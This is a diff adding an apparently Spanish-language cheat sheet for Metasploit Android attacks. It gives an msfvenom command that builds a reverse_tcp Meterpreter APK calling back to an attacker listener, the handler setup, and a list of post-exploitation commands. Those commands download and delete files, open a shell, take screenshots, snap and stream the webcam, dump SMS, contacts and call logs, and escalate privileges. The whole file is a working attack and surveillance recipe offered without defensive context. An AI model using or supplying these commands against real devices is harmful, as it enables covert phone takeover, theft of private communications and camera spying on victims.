@@ -1,0 +1,82 @@
+# Generación del Payload (Android) 
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=4444 -o payload.apk
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# MSFconsole (Listener)
+use exploit/multi/handler [TYPE]
+set payload android/meterpreter/reverse_tcp [PAYLOAD]
+set LHOST 10.10.0.1 [IP_ADDRESS]
+set LPORT 4444 [PORT]
+exploit -j [RUN MULTIPLE PAYLOADS IN BACKGROUND]
+
+# MeterpreterSession
+
+sessions -l [LIST SESSIONS]
+sessions -i [SESSION NUMBER]
+sessions -K [KILL SESSION]
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# Meterpreter Commands (Android - System Information)
+
+help → Muestra todos los comandos disponibles en Meterpreter.
+sysinfo → Muestra información del dispositivo Android (modelo, versión, arquitectura).
+getuid → Muestra el usuario actual del proceso en Android.
+getpid → Muestra el ID del proceso actual donde se ejecuta Meterpreter.
+getenv → Muestra variables de entorno del sistema Android.
+
+# Meterpreter Commands (Android - File System)
+
+pwd → Muestra el directorio actual dentro del sistema Android.
+ls → Lista archivos y carpetas del sistema accesible.
+cd → Cambia de directorio dentro del sistema.
+cat → Muestra el contenido de un archivo.
+download → Descarga archivos desde el dispositivo Android.
+upload → Sube archivos al dispositivo Android.
+search → Busca archivos dentro del sistema de archivos.
+rm → Elimina archivos del sistema Android.
+
+# Meterpreter Commands (Android - Execution)
+
+shell → Abre una terminal del sistema Android (Linux shell).
+execute → Ejecuta comandos o aplicaciones en Android.
+run → Ejecuta módulos internos de Meterpreter.
+
+# Meterpreter Commands (Android - Network)
+
+ifconfig → Muestra la configuración de red del dispositivo.
+ipconfig → Muestra información de red (según versión Android).
+route → Muestra la tabla de rutas de red.
+
+# Meterpreter Commands (Android - Device Control)
+
+ps → Lista procesos en ejecución en Android.
+kill → Finaliza procesos del sistema.
+idletime → Muestra tiempo de inactividad del usuario.
+
+# Meterpreter Commands (Android - Camera & Screen)
+
+screenshot → Captura la pantalla del dispositivo Android.
+webcam_list → Lista cámaras disponibles.
+webcam_snap → Toma una foto con la cámara.
+webcam_stream → Transmisión en vivo de la cámara.
+
+# Meterpreter Commands (Android - Phone Data)
+
+dump_sms → Extrae mensajes SMS (si hay permisos/root).
+contacts → Muestra contactos del dispositivo.
+calllog → Muestra registro de llamadas.
+
+# Meterpreter Commands (Android - Sessions)
+
+background → Envía la sesión a segundo plano.
+sessions → Lista sesiones activas.
+sessions -i <id> → Interactúa con una sesión específica.
+exit → Cierra la sesión de Meterpreter.
+
+# Meterpreter Commands (Android - Privileges)
+
+getsystem → Intenta escalar privilegios a root (requiere exploit/root).
+getprivs → Muestra privilegios actuales del proceso.
+rev2self → Vuelve al usuario original de la sesión.
